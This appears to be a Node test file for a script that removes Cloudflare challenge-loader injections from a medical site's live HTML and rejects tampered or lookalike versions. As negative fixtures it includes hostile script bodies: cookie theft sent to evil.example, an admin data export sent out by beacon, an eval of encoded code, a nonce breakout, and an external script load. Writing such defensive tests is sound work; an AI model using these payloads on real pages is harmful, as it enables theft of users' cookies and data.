import test from 'node:test';
import assert from 'node:assert/strict';
import {normalizeSeonamMediLiveHtml} from '../scripts/seonammedi-live-html-proof.mjs';

const origin='https://ekodi.kr/seonammedi';
const source='<!doctype html><html><head><meta property="og:image" content="x"></head><body><main>hi</main><script src="/seonammedi/app.js" defer></script>\n</body></html>';
const jsd="<script>window.__CF$cv$params={r:'a4f86d6a3ac8a1e8',t:'MTc5MjgzOTA5Nw==',u:'01a16d899f687206b341f5c0bdc3fa89',ut:'FY7hhuH'};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);</script>";
const precursor="<script>window.__CF$cv$params={r:'a4f890e86b2ee144',t:'MTc5Mjg0MDU1MQ==',u:'01a16d9fce29730b8d560eed524bb33a',ut:'b_fEZPyPKPHljgnOwmrIussV8KT42I0UE4rlf78cRTU-1792840551-1.2.1.1-vKoG2fltn.lc7BEtjVBAk6oi3bi81qFEDaoQBezfxoXUkYP699MzUJzQyHjeEK8o2VEIt3TQe4rlw8d25F2iwoMD2Ma1ckho.NTd7UylXgM',i:60};(function(){if(!document.body)return;var s=document.createElement('script');s.src='/cdn-cgi/challenge-platform/scripts/precursor/main.js';document.head.appendChild(s);})();</script>";
const beacon='<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v4bc70e2c01a94c73b74392e4234840661791215815920" integrity="sha512-L0ha0OXavK/8okipN9F8BtP84dg9DUhPERbBXzwI6dgTA55d2+yweo3pn5CSFYs45/r8md2+xvUPtTdvTNRfjA==" data-cf-beacon=\'{"version":"2024.11.0","token":"3a717d2e21e7479bac38f567ef8831ad","r":1,"spa":2}\' crossorigin="anonymous"></script>';
const norm=html=>normalizeSeonamMediLiveHtml(html,{origin,page:'index.html'});

test('Cloudflare JS detections injection is removed byte-exactly in every placement',()=>{
  for(const live of [
    source.replace('\n</body>','\n'+jsd+'</body>'),
    source.replace('\n</body>','\n'+beacon+'\n'+jsd+'</body>'),
  ]){
    const out=norm(live);
    assert.equal(out.html,source);
    assert.equal(out.jsDetections,1);
  }
  assert.equal(norm(source).jsDetections,0);
});

test('lookalike or tampered challenge injections are never silently stripped',()=>{
  const external=jsd.replace("a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js'","a.src='https://evil.example/cdn-cgi/challenge-platform/scripts/jsd/main.js'");
  assert.throws(()=>norm(source.replace('\n</body>','\n'+external+'</body>')),/untrusted_cloudflare_js_detection_injection/);
  const otherPath=jsd.replace('/cdn-cgi/challenge-platform/scripts/jsd/main.js','/evil.js');
  assert.throws(()=>norm(source.replace('\n</body>','\n'+otherPath+'</body>')),/untrusted_cloudflare_js_detection_injection|unrecognized_cloudflare_js_detection_injection/);
  const badRay=jsd.replace("r:'a4f86d6a3ac8a1e8'","r:'zz'");
  assert.throws(()=>norm(source.replace('\n</body>','\n'+badRay+'</body>')),/unrecognized_cloudflare_js_detection_injection/);
  const midPage=source.replace('<main>',jsd+'<main>');
  assert.throws(()=>norm(midPage),/unrecognized_cloudflare_js_detection_injection/);
  const twice=source.replace('\n</body>','\n'+jsd+'\n'+jsd+'</body>');
  assert.throws(()=>norm(twice),/multiple_cloudflare_js_detection_injections|unrecognized_cloudflare_js_detection_injection/);
});

test('live 2026-10-24 Cloudflare precursor loader shape is removed byte-exactly',()=>{
  const out=norm(source.replace('\n</body>','\n'+precursor+'</body>'));
  assert.equal(out.html,source);
  assert.equal(out.jsDetections,1);
  const external=precursor.replace("s.src='/cdn-cgi","s.src='https://evil.example/cdn-cgi");
  assert.throws(()=>norm(source.replace('\n</body>','\n'+external+'</body>')),/untrusted_cloudflare_js_detection_injection/);
  const both=precursor.replace("document.head.appendChild(s);","document.head.appendChild(s);s.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';");
  assert.throws(()=>norm(source.replace('\n</body>','\n'+both+'</body>')),/untrusted_cloudflare_js_detection_injection/);
});

test('no-newline page (notices) keeps its exact bytes after removal',()=>{
  const tight=source.replace('\n</body>','</body>');
  const out=norm(tight.replace('</body>',precursor+'</body>'));
  assert.equal(out.html,tight);
  const spaced=source.replace('\n</body>','\n'+jsd+'\n</body>');
  assert.throws(()=>norm(spaced),/unrecognized_cloudflare_js_detection_injection/);
});

test('loader body must be an audited Cloudflare template, not any script that mentions the jsd path',()=>{
  const params="window.__CF$cv$params={r:'a4f86d6a3ac8a1e8',t:'MTc5MjgzOTA5Nw=='};";
  const jsdPath="'/cdn-cgi/challenge-platform/scripts/jsd/main.js'";
  const forged=body=>source.replace('\n</body>','\n<script>'+params+body+'</script></body>');
  for(const body of [
    "fetch('/api/seonammedi/admin/export').then(r=>r.text()).then(t=>navigator.sendBeacon('/x',t));"+jsdPath,
    "new Image().src='//evil.example/?'+document.cookie;"+jsdPath,
    "eval(atob('YWxlcnQoMSk='));"+jsdPath,
    "var a=document.createElement('script');a.src="+jsdPath+";document.getElementsByTagName('head')[0].appendChild(a);localStorage.clear();",
  ]){
    assert.throws(()=>norm(forged(body)),/untrusted_cloudflare_js_detection_injection/,body);
  }
});

test('Cloudflare CSP nonce variant of both loaders is accepted; a script-breaking nonce is not',()=>{
  const jsdNonce=jsd.replace("a.src=","a.nonce='aGVsbG8=';a.src=");
  const preNonce=precursor.replace("s.src=","s.nonce='aGVsbG8=';s.src=");
  for(const tag of [jsdNonce,preNonce]){
    assert.equal(norm(source.replace('\n</body>','\n'+tag+'</body>')).html,source);
  }
  const breakout=jsd.replace("a.src=","a.nonce='x';alert(1);a.nonce='';a.src=");
  assert.throws(()=>norm(source.replace('\n</body>','\n'+breakout+'</body>')),/untrusted_cloudflare_js_detection_injection/);
});
